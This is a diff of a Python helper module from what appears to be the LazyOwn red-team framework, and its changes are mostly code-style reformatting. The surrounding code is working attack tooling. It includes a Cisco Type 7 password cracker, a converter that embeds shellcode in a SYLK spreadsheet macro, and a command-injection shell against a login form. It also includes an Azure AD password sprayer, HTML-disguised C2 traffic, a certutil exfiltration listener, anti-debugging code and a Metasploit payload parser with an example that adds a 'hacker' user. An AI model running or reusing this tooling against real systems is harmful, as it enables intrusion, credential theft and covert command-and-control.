 def crack_password(crypttext):
     """Crack a Cisco Type 7 password.
@@ -1740,7 +1853,7 @@ def crack_password(crypttext):
         str: The cracked plaintext password or an empty string if invalid.
     """
     crypttext = crypttext.upper()
-    plaintext = ''
+    plaintext = ""
     xlat = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
     seed, val = 0, 0
 
@@ -1757,8 +1870,8 @@ def crack_password(crypttext):
 
         if is_digit(crypttext[i]):
             val += ord(crypttext[i]) - 0x30
-        elif 'A' <= crypttext[i] <= 'F':
-            val += ord(crypttext[i]) - ord('A') + 0x0A
+        elif "A" <= crypttext[i] <= "F":
+            val += ord(crypttext[i]) - ord("A") + 0x0A
         else:
             return ""
 
@@ -1769,6 +1882,7 @@ def crack_password(crypttext):
 
     return plaintext
 
+
 def get_terminal_size():
     try:
         size = os.get_terminal_size(sys.stdout.fileno())
@@ -1776,6 +1890,7 @@ def get_terminal_size():
     except Exception as e:
         print_error(f"Cannot get the size: {e}")
         return None, None
+
 
 def halp():
     """
@@ -1813,7 +1928,9 @@ def halp():
     print(f"    {YELLOW}Options:")
     print(f"    {GREEN}  --help             Show this help panel.")
     print(f"    {GREEN}  -v                 Show version.")
-    print(f"    {GREEN}  -p <payloadN.json> Exec with different payload.json example. ./run -p payload1.json, (Special for RedTeams)")
+    print(
+        f"    {GREEN}  -p <payloadN.json> Exec with different payload.json example. ./run -p payload1.json, (Special for RedTeams)"
+    )
     print(f"    {GREEN}  -c <command>       Exec a command using LazyOwn example: ping")
     print(f"    {GREEN}  --no-banner        No Banner{RESET}")
     print(f"    {GREEN}  -s                 Run as root {RESET}")
@@ -1822,11 +1939,11 @@ def halp():
     print(f"    {GREEN}  --headless         Non-interactive mode for CI/CD pipelines.{RESET}")
     print(f"    {GREEN}  --json-output      Emit structured JSON per command (use with --headless).{RESET}")
     print(f"    {GREEN}  --profile <file>   YAML profile overriding payload.json keys.{RESET}")
-    print(f"    {GREEN}  --run-chain <cmds> Semicolon-separated command chain (e.g. \"scan; enum\").{RESET}")
+    print(f'    {GREEN}  --run-chain <cmds> Semicolon-separated command chain (e.g. "scan; enum").{RESET}')
     print("")
     print(f"    {CYAN}Headless examples:{RESET}")
-    print(f"    {WHITE}  ./run --headless --json-output -c \"nmap_scan\"{RESET}")
-    print(f"    {WHITE}  ./run --headless --profile ops.yaml --run-chain \"recon; enum; exploit\"{RESET}")
+    print(f'    {WHITE}  ./run --headless --json-output -c "nmap_scan"{RESET}')
+    print(f'    {WHITE}  ./run --headless --profile ops.yaml --run-chain "recon; enum; exploit"{RESET}')
     sys.exit(0)
 
 
@@ -1857,26 +1974,14 @@ def ensure_tmux_session(session_name):
         - The command executed within the tmux session must be valid and
           accessible in the current environment.
     """
-    result = subprocess.run(
-        ["tmux", "has-session", "-t", session_name],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE
-    )
+    result = subprocess.run(["tmux", "has-session", "-t", session_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     if result.returncode != 0:
         q = shlex.quote(session_name)
-        subprocess.run(
-            ["tmux", "has-session", "-t", session_name],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE
-        )
-        subprocess.run(
-            ["tmux", "new-session", "-d", "-s", session_name, "./run --no-banner"],
-            check=False
-        )
-        subprocess.run(
-            ["tmux", "attach", "-t", session_name],
-            check=False
-        )
+        subprocess.run(["tmux", "has-session", "-t", session_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(["tmux", "new-session", "-d", "-s", session_name, "./run --no-banner"], check=False)
+        subprocess.run(["tmux", "attach", "-t", session_name], check=False)
+
 
 def get_xml(directory):
     """
@@ -1890,6 +1995,7 @@ def get_xml(directory):
     """
     return [file for file in os.listdir(directory) if file.endswith(".xml")]
 
+
 def get_domain_from_xml(xml_file):
     """
     Extracts the first domain or IP address from an Nmap scan XML file.
@@ -1900,7 +2006,7 @@ def get_domain_from_xml(xml_file):
         print(f"[!] The XML file '{xml_file}' does not exist.")
         return None
 
-    with open(xml_file, 'r') as file:
+    with open(xml_file, "r") as file:
         xml_content = file.read()
 
     ip_match = re.search(r'<address addr="([\d\.]+)"', xml_content)
@@ -1919,6 +2025,7 @@ def get_domain_from_xml(xml_file):
 
     return domain
 
+
 def shellcode_to_sylk(shellcode_path):
 
     sylk_output = SYLK_TEMPLATE
@@ -1930,17 +2037,17 @@ def shellcode_to_sylk(shellcode_path):
         byte = f.read(1)
         while byte != b"":
             if charinline == 0:
-                sylk_output += ("C;X2;Y%s;E" % (str(cell)))
+                sylk_output += "C;X2;Y%s;E" % (str(cell))
                 cell += 1
             else:
-                sylk_output+=("&")
-            sylk_output += ("CHAR(" + str(ord(byte)) + ")")
+                sylk_output += "&"
+            sylk_output += "CHAR(" + str(ord(byte)) + ")"
             byte = f.read(1)
             charinline += 1
             if charinline == 20:
-                sylk_output += ("\n")
+                sylk_output += "\n"
                 charinline = 0
-    sylk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
+    sylk_output += "\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell))
     return sylk_output
 
 
@@ -1949,7 +2056,7 @@ def get_banner(ip, port):
         s.settimeout(2)
         try:
             s.connect((ip, int(port)))
-            s.sendall(b'\n')
+            s.sendall(b"\n")
             banner = s.recv(1024)
             return banner.decode().strip()
 
@@ -1960,7 +2067,8 @@ def get_banner(ip, port):
         except Exception as e:
             return f"Error: {str(e)}"
 
-def list_binaries(directory='sessions'):
+
+def list_binaries(directory="sessions"):
     """
     List all executable binaries in the specified directory.
 
@@ -1978,6 +2086,7 @@ def list_binaries(directory='sessions'):
                 binaries.append(file_path)
 
     return binaries
+
 
 def select_binary(binaries):
     """
@@ -2003,6 +2112,7 @@ def select_binary(binaries):
         except ValueError:
             print_error("Please enter a number.")
 
+
 def decode(data):
     """
     Decodes base64 data received from the server output.
@@ -2017,18 +2127,20 @@ def decode(data):
     try:
         decoded_data = base64.b64decode(data)
     except Exception:
-        return '[-] Decoding error'
-    return decoded_data.decode('utf-8', errors='ignore')
+        return "[-] Decoding error"
+    return decoded_data.decode("utf-8", errors="ignore")
+
 
 def get_command(url, lhost):
     """
     Reads a command from standard input and initiates a thread to send the command to the target server.
     """
     try:
-        cmd = input('    :\\> ')
-        threading.Thread(target=send_command, args=(cmd,url,lhost)).start()
+        cmd = input("    :\\> ")
+        threading.Thread(target=send_command, args=(cmd, url, lhost)).start()
     except (EOFError, KeyboardInterrupt):
         sys.exit(0)
+
 
 def send_command(cmd, url, lhost):
     """
@@ -2048,14 +2160,15 @@ def send_command(cmd, url, lhost):
     payload += "--"
 
     login = {
-        'B1': 'LogIn',
-        'logintype': payload % cmd,
-        'username': "admin",
-        'rememberme': 'ON',
-        'password': "admin",
+        "B1": "LogIn",
+        "logintype": payload % cmd,
+        "username": "admin",
+        "rememberme": "ON",
+        "password": "admin",
     }
 
     requests.post(url, data=login)
+
 
 def activate_server(httpd, url, lhost):
     """
@@ -2067,6 +2180,7 @@ def activate_server(httpd, url, lhost):
     get_command(url, lhost)
     httpd.server_activate()
 
+
 def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
 
     results = []
@@ -2076,7 +2190,7 @@ def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
     if verbose or more_verbose:
         print("Targeting: " + target_url + "\n")
 
-    headers = {'Content-Type':'text/xml'}
+    headers = {"Content-Type": "text/xml"}
 
     for user in users:
         if more_verbose:
@@ -2087,25 +2201,25 @@ def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
         if more_verbose:
             print("Status: " + str(r.status_code))
 
-        if 'ThrottleStatus' in r.headers.keys():
-            print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))
+        if "ThrottleStatus" in r.headers.keys():
+            print("Throttling detected => ThrottleStatus: " + r.headers("ThrottleStatus"))
 
-        if 'IfExistsResult' in r.content.decode('UTF-8'):
+        if "IfExistsResult" in r.content.decode("UTF-8"):
             print(r.content)
             sys.exit()
 
         if r.status_code == 200:
-            results.append([user + '@' + domain, 'Success', password])
+            results.append([user + "@" + domain, "Success", password])
             if verbose:
                 print(user + "@" + domain + "\t\t:: success")
             continue
 
         for code in AD_codes:
-            if code in r.content.decode('UTF-8'):
-                if code == 'AADSTS50034':
-                    results.append([user + "@" + domain, code, 'NOUSER'])
+            if code in r.content.decode("UTF-8"):
+                if code == "AADSTS50034":
+                    results.append([user + "@" + domain, code, "NOUSER"])
                 else:
-                    results.append([user + "@" + domain, code, 'User Exists'])
+                    results.append([user + "@" + domain, code, "User Exists"])
                 if more_verbose:
                     print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
                 break
@@ -2117,16 +2231,17 @@ def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
 def ProcessResults(results, outfile):
 
     for result in results:
-        if result[1] == 'Success':
+        if result[1] == "Success":
             outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
         else:
             continue
 
     for result in results:
-        if result[1] == 'Success':
+        if result[1] == "Success":
             continue
         else:
             outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")
+
 
 def generate_index(repo_dir):
     """
@@ -2138,34 +2253,25 @@ def generate_index(repo_dir):
     Returns:
     None
     """
-    dists_dir = os.path.join(repo_dir, 'dists/kali-rolling/main/binary-amd64')
+    dists_dir = os.path.join(repo_dir, "dists/kali-rolling/main/binary-amd64")
     os.makedirs(dists_dir, exist_ok=True)
 
-    pool_dir = os.path.join(repo_dir, 'pool/main')
+    pool_dir = os.path.join(repo_dir, "pool/main")
     os.makedirs(pool_dir, exist_ok=True)
 
     for package in os.listdir(repo_dir):
-        if package.endswith('.deb'):
+        if package.endswith(".deb"):
             shutil.move(os.path.join(repo_dir, package), os.path.join(pool_dir, package))
 
     with open(os.path.join(dists_dir, "Packages"), "w") as fh:
-        subprocess.run(
-            ["dpkg-scanpackages", pool_dir, "/dev/null"],
-            stdout=fh, check=True
-        )
+        subprocess.run(["dpkg-scanpackages", pool_dir, "/dev/null"], stdout=fh, check=True)
     with open(os.path.join(dists_dir, "Packages.gz"), "wb") as fh:
-        subprocess.run(
-            ["gzip", "-9c", os.path.join(dists_dir, "Packages")],
-            stdout=fh, check=True
-        )
+        subprocess.run(["gzip", "-9c", os.path.join(dists_dir, "Packages")], stdout=fh, check=True)
     with open(os.path.join(dists_dir, "Packages.xz"), "wb") as fh:
-        subprocess.run(
-            ["xz", "-9c", os.path.join(dists_dir, "Packages")],
-            stdout=fh, check=True
-        )
+        subprocess.run(["xz", "-9c", os.path.join(dists_dir, "Packages")], stdout=fh, check=True)
 
-    release_file = os.path.join(repo_dir, 'dists/kali-rolling/Release')
-    with open(release_file, 'w') as release:
+    release_file = os.path.join(repo_dir, "dists/kali-rolling/Release")
+    with open(release_file, "w") as release:
         release.write("Origin: Kali\n")
         release.write("Label: Kali\n")
         release.write("Suite: rolling\n")
@@ -2180,12 +2286,11 @@ def generate_index(repo_dir):
             file_path = os.path.relpath(os.path.join(root, file), repo_dir)
             index_content.append(f'<a href="{file_path}">{file}</a><br>')
 
-    with open(os.path.join(repo_dir, 'index.html'), 'w') as index_file:
-        index_file.write('<html><body>\n')
-        index_file.write('<h1>APT Repository Index</h1>\n')
-        index_file.write(''.join(index_content))
-        index_file.write('</body></html>\n')
-
+    with open(os.path.join(repo_dir, "index.html"), "w") as index_file:
+        index_file.write("<html><body>\n")
+        index_file.write("<h1>APT Repository Index</h1>\n")
+        index_file.write("".join(index_content))
+        index_file.write("</body></html>\n")
 
 
 def replace_variables(command, variables):
@@ -2208,6 +2313,7 @@ def replace_variables(command, variables):
         command = command.replace(var, value)
     return command
 
+
 def create_caldera_config(file_path):
     """
     Creates a Caldera configuration file with the specified content at the given file path.
@@ -2219,6 +2325,7 @@ def create_caldera_config(file_path):
     None
     """
     import secrets
+
     api_key_blue = secrets.token_hex(16)
     api_key_red = secrets.token_hex(16)
     encryption_key = secrets.token_hex(16)
@@ -2295,12 +2402,13 @@ users:
 """
 
     try:
-        with open(file_path, 'w') as file:
+        with open(file_path, "w") as file:
             file.write(config_content)
         os.chmod(file_path, 0o600)
         print_msg(f"Configuration file created successfully at {file_path}")
     except Exception as e:
         print_error(f"Error creating configuration file: {e}")
+
 
 def extract_banners(xml_file):
     """
@@ -2328,29 +2436,28 @@ def extract_banners(xml_file):
     root = tree.getroot()
 
     banners = []
-    for host in root.findall('host'):
+    for host in root.findall("host"):
+        hostname = host.find("address").get("addr")
 
-        hostname = host.find('address').get('addr')
-
-        for port in host.findall('ports/port'):
-
-            service = port.find('service')
+        for port in host.findall("ports/port"):
+            service = port.find("service")
             if service is not None:
-                name = service.get('name')
+                name = service.get("name")
 
-                extrainfo = service.get('extrainfo')
+                extrainfo = service.get("extrainfo")
 
-
-                banners.append({
-                    'hostname': hostname,
-                    'port': port.get('portid'),
-                    'protocol': port.get('protocol'),
-                    'banner': extrainfo,
-
-                    'service': name
-                })
+                banners.append(
+                    {
+                        "hostname": hostname,
+                        "port": port.get("portid"),
+                        "protocol": port.get("protocol"),
+                        "banner": extrainfo,
+                        "service": name,
+                    }
+                )
 
     return banners
+
 
 def scrape_news():
     """
@@ -2361,19 +2468,19 @@ def scrape_news():
     """
     url = "https://news.ycombinator.com/"
     response = requests.get(url)
-    soup = BeautifulSoup(response.content, 'html.parser')
+    soup = BeautifulSoup(response.content, "html.parser")
 
     titles = []
     links = []
     scores = []
 
-    for item in soup.find_all('tr', class_='athing'):
-        title_line = item.find('span', class_='titleline')
+    for item in soup.find_all("tr", class_="athing"):
+        title_line = item.find("span", class_="titleline")
         if title_line:
             title = title_line.text
-            title_link = title_line.find('a')
-            link = title_link['href']
-            score = item.find_next_sibling('tr').find('span', class_='score')
+            title_link = title_line.find("a")
+            link = title_link["href"]
+            score = item.find_next_sibling("tr").find("span", class_="score")
             if score:
                 score = score.text
             else:
@@ -2386,6 +2493,7 @@ def scrape_news():
 
     return titles, links, scores
 
+
 def display_news(titles, links, scores):
     """
     Creates a pandas DataFrame and prints it, showing titles, links, and scores.
@@ -2395,13 +2503,10 @@ def display_news(titles, links, scores):
         links (list): List of news links.
         scores (list): List of news scores.
     """
-    df = pd.DataFrame({
-        'Title': titles,
-        'Link': links,
-        'Score': scores
-    })
+    df = pd.DataFrame({"Title": titles, "Link": links, "Score": scores})
 
     print_msg(df)
+
 
 def htmlify(data):
     """Wrap C2 comms in html and html2 code to make requests look more legitimate"""
@@ -2411,7 +2516,8 @@ def htmlify(data):
     html2 = "</b>\n"
     html2 += "</body>\n"
     html2 += "</html>\n"
-    return(html + data + "\n" + html2)
+    return html + data + "\n" + html2
+
 
 def de_htmlify(data):
     """Cleant wrap C2 comms of html and html2 code to get the command from request"""
@@ -2421,10 +2527,11 @@ def de_htmlify(data):
     html2 = "</b>\n"
     html2 += "</body>\n"
     html2 += "</html>\n"
-    data = data.replace(html,'').replace(html2,'')
-    return(data)
+    data = data.replace(html, "").replace(html2, "")
+    return data
 
-def is_port_in_use(port, host='127.0.0.1'):
+
+def is_port_in_use(port, host="127.0.0.1"):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
             s.bind((host, port))
@@ -2446,6 +2553,7 @@ def return_creds():
 
             return credentials
 
+
 def query_arin_ip(ip):
     """Queries ARIN whois API for organization information of an IP address.
 
@@ -2463,6 +2571,7 @@ def query_arin_ip(ip):
     except Exception as e:
         print_error(f"ARIN API failed: {e}")
     return None
+
 
 def get_org(data):
     """Extracts organization name from ARIN whois response data.
@@ -2482,9 +2591,10 @@ def get_org(data):
 
 
 def load_adversary():
-    with open('adversary.json', 'r') as file:
+    with open("adversary.json", "r") as file:
         config_list = json.load(file)
     return [Config(config) for config in config_list]
+
 
 def replace_placeholders(template, replacements):
     """
@@ -2502,6 +2612,7 @@ def replace_placeholders(template, replacements):
         str: The template string with placeholders replaced.
     """
     return replace_command_placeholders(template, replacements)
+
 
 def replace_command_placeholders(command, params):
     """
@@ -2526,10 +2637,11 @@ def replace_command_placeholders(command, params):
         key = token.strip("{}").strip()
         return str(params.get(key, token))
 
-    return re.sub(r'(\{\{[^{}]*?\}\}|\{[^{}]*?\})', replace_match, command)
+    return re.sub(r"(\{\{[^{}]*?\}\}|\{[^{}]*?\})", replace_match, command)
+
 
 def parse_nmap_csv(csv_path):
-    df = pd.read_csv(csv_path, delimiter=";", on_bad_lines='skip')
+    df = pd.read_csv(csv_path, delimiter=";", on_bad_lines="skip")
     services = {}
     for _, row in df.iterrows():
         service_name = row["SERVICE"].strip().lower()
@@ -2538,23 +2650,15 @@ def parse_nmap_csv(csv_path):
         version = row.get("VERSION", "")
         if service_name not in services:
             services[service_name] = []
-        services[service_name].append({
-            "ip": ip,
-            "port": port,
-            "version": version
-        })
+        services[service_name].append({"ip": ip, "port": port, "version": version})
     return services
+
+
 def query_ollama(prompt, model="deepseek-r1:1.5b"):
     """Sends query to Ollama and returns model response."""
     try:
         response = requests.post(
-            "http://localhost:11434/api/generate",
-            json={
-                "model": model,
-                "prompt": prompt,
-                "stream": False
-            },
-            timeout=600
+            "http://localhost:11434/api/generate", json={"model": model, "prompt": prompt, "stream": False}, timeout=600
         )
         if response.status_code == 200:
             return response.json()["response"]
@@ -2564,6 +2668,7 @@ def query_ollama(prompt, model="deepseek-r1:1.5b"):
         print_error(f"[!] Ollama error: {str(e)}")
         return None
 
+
 def preprocess_llm_response(response):
     """
     Pre-process LLM response to handle common issues before YAML parsing
@@ -2571,14 +2676,14 @@ def preprocess_llm_response(response):
     import re
 
     # Remove any markdown code block markers
-    response = re.sub(r'```yaml\s*', '', response)
-    response = re.sub(r'```\s*', '', response)
+    response = re.sub(r"```yaml\s*", "", response)
+    response = re.sub(r"```\s*", "", response)
 
     # Remove any thinking or explanatory text
     if "<think>" in response:
         think_end = response.find("</think>")
         if think_end > 0:
-            response = response[think_end + 8:].strip()
+            response = response[think_end + 8 :].strip()
 
     # Remove any leading text before apt_name
     apt_name_pos = response.find("apt_name:")
@@ -2587,14 +2692,14 @@ def preprocess_llm_response(response):
 
     # Remove any trailing text after the YAML content
     last_yaml_line = -1
-    lines = response.split('\n')
+    lines = response.split("\n")
     for i, line in enumerate(lines):
         stripped = line.strip()
-        if stripped and not stripped.startswith('#') and ':' in stripped:
+        if stripped and not stripped.startswith("#") and ":" in stripped:
             last_yaml_line = i
 
     if last_yaml_line >= 0 and last_yaml_line < len(lines) - 1:
-        response = '\n'.join(lines[:last_yaml_line + 1])
+        response = "\n".join(lines[: last_yaml_line + 1])
 
     return response
 
@@ -2605,19 +2710,18 @@ def manual_yaml_extraction(content):
     """
     import re
 
-
     result = {}
-    lines = content.split('\n')
+    lines = content.split("\n")
 
     # Extract apt_name
-    apt_name_match = re.search(r'apt_name:\s*(.+)', content)
+    apt_name_match = re.search(r"apt_name:\s*(.+)", content)
     if apt_name_match:
-        result['apt_name'] = apt_name_match.group(1).strip()
+        result["apt_name"] = apt_name_match.group(1).strip()
 
     # Extract description
-    desc_match = re.search(r'description:\s*(.+)', content)
+    desc_match = re.search(r"description:\s*(.+)", content)
     if desc_match:
-        result['description'] = desc_match.group(1).strip()
+        result["description"] = desc_match.group(1).strip()
 
     # Extract steps - this is more complex
     steps = []
@@ -2628,7 +2732,9 @@ def manual_yaml_extraction(content):
         stripped = line.strip()
 
         # Start of a new step
-        if stripped.startswith('- atomic_id:') or (stripped == '-' and lines.index(line) < len(lines) - 1 and 'atomic_id:' in lines[lines.index(line) + 1]):
+        if stripped.startswith("- atomic_id:") or (
+            stripped == "-" and lines.index(line) < len(lines) - 1 and "atomic_id:" in lines[lines.index(line) + 1]
+        ):
             if current_step:
                 steps.append(current_step)
             current_step = {}
@@ -2638,19 +2744,19 @@ def manual_yaml_extraction(content):
         # Parse step properties
         if current_step is not None:
             # Handle mitre_info subsection
-            if 'mitre_info:' in stripped:
+            if "mitre_info:" in stripped:
                 in_mitre_info = True
-                current_step['mitre_info'] = {}
+                current_step["mitre_info"] = {}
                 continue
 
             # Parse regular key-value pairs
-            if ':' in stripped:
-                parts = stripped.split(':', 1)
+            if ":" in stripped:
+                parts = stripped.split(":", 1)
                 key = parts[0].strip()
                 value = parts[1].strip() if len(parts) > 1 else ""
 
                 if in_mitre_info:
-                    current_step['mitre_info'][key] = value
+                    current_step["mitre_info"][key] = value
                 else:
                     current_step[key] = value
 
@@ -2659,9 +2765,10 @@ def manual_yaml_extraction(content):
         steps.append(current_step)
 
     if steps:
-        result['steps'] = steps
+        result["steps"] = steps
 
-    return result if 'apt_name' in result and 'steps' in result else None
+    return result if "apt_name" in result and "steps" in result else None
+
 
 def create_synthetic_yaml(nmap_services):
     """
@@ -2695,7 +2802,7 @@ def create_synthetic_yaml(nmap_services):
     playbook = {
         "apt_name": "SyntheticAttackChain",
         "description": "Automatically generated playbook based on discovered services",
-        "steps": []
+        "steps": [],
     }
 
     # Generate steps based on discovered services
@@ -2727,16 +2834,14 @@ def create_synthetic_yaml(nmap_services):
                 "description": f"Attempt to exploit {service_name} service",
                 "command": command,
                 "service": service_name,
-                "mitre_info": {
-                    "mitre_id": technique["id"],
-                    "mitre_name": technique["name"]
-                }
+                "mitre_info": {"mitre_id": technique["id"], "mitre_name": technique["name"]},
             }
 
             playbook["steps"].append(step)
             step_id += 1
 
     return playbook
+
 
 def parse_yaml_response(content):
     """
@@ -2771,6 +2876,8 @@ def parse_yaml_response(content):
         except Exception as e2:
             print_error(f"[!] Recovery attempt failed: {str(e2)}")
             return None
+
+
 def fix_common_yaml_issues(yaml_content):
     """Fixes common YAML formatting issues"""
     import re
@@ -2780,7 +2887,7 @@ def fix_common_yaml_issues(yaml_content):
     current_indent = 0
     expected_indent = None
 
-    for line in yaml_content.split('\n'):
+    for line in yaml_content.split("\n"):
         stripped = line.lstrip()
 
         # Skip empty lines
@@ -2792,30 +2899,31 @@ def fix_common_yaml_issues(yaml_content):
         indent = len(line) - len(stripped)
 
         # Fix common issue with mixed spaces and improper indentation
-        if stripped.startswith('- ') and expected_indent is not None and indent != expected_indent:
+        if stripped.startswith("- ") and expected_indent is not None and indent != expected_indent:
             # Adjust indentation for list items
-            fixed_line = ' ' * expected_indent + stripped
+            fixed_line = " " * expected_indent + stripped
             fixed_content.append(fixed_line)
         else:
             fixed_content.append(line)
 
         # Set expected indentation for next items if this is a property
-        if ':' in stripped and not stripped.startswith('- '):
+        if ":" in stripped and not stripped.startswith("- "):
             current_indent = indent
             expected_indent = indent + 2  # Common YAML convention for nested items
 
     # Fix 2: Fix invalid mapping values (the specific error you encountered)
-    result = '\n'.join(fixed_content)
-    result = re.sub(r'(\w+):\s+(\w+):\s+', r'\1:\n  \2: ', result)
+    result = "\n".join(fixed_content)
+    result = re.sub(r"(\w+):\s+(\w+):\s+", r"\1:\n  \2: ", result)
 
     return result
+
 
 def aggressive_yaml_fix(yaml_content):
     """More aggressive YAML fixing for recovery attempts"""
     import re
 
     # Fix multi-line values without proper block scalar indicators
-    lines = yaml_content.split('\n')
+    lines = yaml_content.split("\n")
     fixed_lines = []
     in_block = False
 
@@ -2823,8 +2931,8 @@ def aggressive_yaml_fix(yaml_content):
         stripped = line.lstrip()
 
         # Handle mapping errors - common cause of "mapping values not allowed here"
-        if re.search(r':\s+\w+:\s+', line):
-            parts = re.split(r':\s+', line, 1)
+        if re.search(r":\s+\w+:\s+", line):
+            parts = re.split(r":\s+", line, 1)
             if len(parts) > 1:
                 fixed_lines.append(f"{parts[0]}:")
                 fixed_lines.append(f"  {parts[1]}")
@@ -2833,13 +2941,12 @@ def aggressive_yaml_fix(yaml_content):
         fixed_lines.append(line)
 
     # Try to identify and fix specific line with error
-    content = '\n'.join(fixed_lines)
+    content = "\n".join(fixed_lines)
 
     # Last resort: Replace any potential inline mapping errors
-    content = re.sub(r'(\w+):\s+(\w+):\s+', r'\1:\n  \2: ', content)
+    content = re.sub(r"(\w+):\s+(\w+):\s+", r"\1:\n  \2: ", content)
 
     return content
-
 
 
 def save_playbook(playbook_data, playbook_name):
@@ -2853,12 +2960,14 @@ def save_playbook(playbook_data, playbook_name):
 
     return playbook_path
 
+
 def load_knowledge_base(knowledge_file="my_techniques.json"):
     """Carga la base de conocimientos personalizada."""
     if os.path.exists(knowledge_file):
         with open(knowledge_file, "r") as f:
             return json.load(f)
     return []
+
 
 def anti_debug():
     if os.path.exists("/proc/self/status"):
@@ -2867,6 +2976,7 @@ def anti_debug():
                 if line.startswith("TracerPid:") and int(line.split()[1]) != 0:
                     print_error("DEBUG DETECTED. EXITING!.")
                     os.kill(os.getpid(), signal.SIGTERM)
+
 
 def create_msfshellcoder_parser():
     parser = argparse.ArgumentParser(
@@ -2877,7 +2987,7 @@ Examples:
   msfshellcoder -c "calc.exe" --os windows
   msfshellcoder
         """,
-        formatter_class=argparse.RawDescriptionHelpFormatter
+        formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     parser.add_argument("-p", "--payload", help="MSF payload (e.g., windows/x64/meterpreter/reverse_tcp)")
     parser.add_argument("-c", "--command", help="Custom command to execute (e.g., 'net user hacker P@ss /add')")
@@ -2887,11 +2997,12 @@ Examples:
     parser.add_argument("--arch", choices=["x86", "x64"], default="x64", help="Architecture (default: x64)")
     return parser
 
+
 def load_user_aliases():
     """Carga los aliases del archivo JSON si existe."""
     if os.path.exists(USER_ALIASES_FILE):
         try:
-            with open(USER_ALIASES_FILE, 'r') as f:
+            with open(USER_ALIASES_FILE, "r") as f:
                 return json.load(f)
         except (json.JSONDecodeError, PermissionError) as e:
             print_error(f"[!] Error al cargar {USER_ALIASES_FILE}: {e}")
@@ -2899,17 +3010,19 @@ def load_user_aliases():
     return {}
 
 
-
 class MyServer(HTTPServer):
     """
     Custom HTTP server to handle incoming connections from certutil.
     """
+
     pass
+
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     """
     Custom HTTP request handler to intercept and decode GET requests from certutil.
     """
+
     def log_request(self, *args, **kwargs):
         return
 
@@ -2925,11 +3038,11 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             data = load_payload()
         except (OSError, ValueError):
             data = {}
-        url = data.get('url', 'URL not found')
-        lhost = data.get('lhost', 'LHOST not found')
+        url = data.get("url", "URL not found")
+        lhost = data.get("lhost", "LHOST not found")
         if query_id % 2 == 0:
             output = self.path
-            if output != '/':
+            if output != "/":
                 print(decode(output[1:]))
             get_command(url, lhost)
         query_id += 1
@@ -2943,14 +3056,14 @@ class IP2ASN:
 
     def open_file(self, filename):
         """Open and parse the IP-to-ASN file."""
-        with open(filename, 'rb') as f:
+        with open(filename, "rb") as f:
             self.open_reader(f)
 
     def open_reader(self, reader):
         """Parse the reader stream, handling both regular and gzipped files."""
-        if reader.read(2) == b'\x1f\x8b':
+        if reader.read(2) == b"\x1f\x8b":
             reader.seek(0)
-            with gzip.open(reader, 'rb') as f:
+            with gzip.open(reader, "rb") as f:
                 self._parse_file(f)
         else:
             reader.seek(0)
@@ -2959,8 +3072,8 @@ class IP2ASN:
     def _parse_file(self, reader):
         """Parse the TSV data and load it into memory."""
         for line in reader:
-            line = line.decode('utf-8').strip()
-            parts = line.split('\t')
+            line = line.decode("utf-8").strip()
+            parts = line.split("\t")
             if len(parts) < 5:
                 continue
             start_ip, end_ip, asn, country, desc = parts[:5]
@@ -3009,6 +3122,7 @@ class IP2ASN:
         """Get the country by ASN."""
         return self.as_country.get(asn, "Unknown")
 
+
 VULN_SESSION_FILE_TEMPLATE = "vulns_{target}.json"
 VULN_SCHEMA_VERSION = 1
 VULN_REPORT_PRINT_HEADER = "CVE ID;   Description;   CVSS;  URL"
@@ -3016,12 +3130,9 @@ VULN_CVSS_UNAVAILABLE = "unavailable"
 VULN_DEFAULT_MAX_WORKERS = 20
 VULN_DEFAULT_DESCRIPTION_LANG = "en"
 VULN_DEFAULT_USER_AGENT = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
 )
-VULN_NVD_URL_TEMPLATE = (
-    "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={service}"
-)
+VULN_NVD_URL_TEMPLATE = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={service}"
 VULN_CVE_DETAILS_URL_TEMPLATE = "https://www.cvedetails.com/cve/{cve_id}/"
 VULN_HTTP_OK = 200
 
@@ -3092,9 +3203,7 @@ class VulnerabilityScanner:
             print_error(f"NVD request failed: {exc}")
             return []
         if response.status_code != VULN_HTTP_OK:
-            print_error(
-                f"NVD returned HTTP {response.status_code} while searching '{service}'."
-            )
+            print_error(f"NVD returned HTTP {response.status_code} while searching '{service}'.")
             return []
         data_dict = response.json()
         cves_info: list[dict] = []
@@ -3105,11 +3214,7 @@ class VulnerabilityScanner:
                 continue
             descriptions = cve_node.get("descriptions", [])
             description = next(
-                (
-                    item.get("value")
-                    for item in descriptions
-                    if item.get("lang") == self._description_language
-                ),
+                (item.get("value") for item in descriptions if item.get("lang") == self._description_language),
                 None,
             )
             cves_info.append(
@@ -3143,9 +3248,7 @@ class VulnerabilityScanner:
             return
         soup = BeautifulSoup(response.content, "html.parser")
         cvss_info = soup.find("div", {"class": "cvssbox"})
-        cve_info["cvss"] = (
-            cvss_info.get_text().strip() if cvss_info else VULN_CVSS_UNAVAILABLE
-        )
+        cve_info["cvss"] = cvss_info.get_text().strip() if cvss_info else VULN_CVSS_UNAVAILABLE
         cve_info["url"] = details_url
 
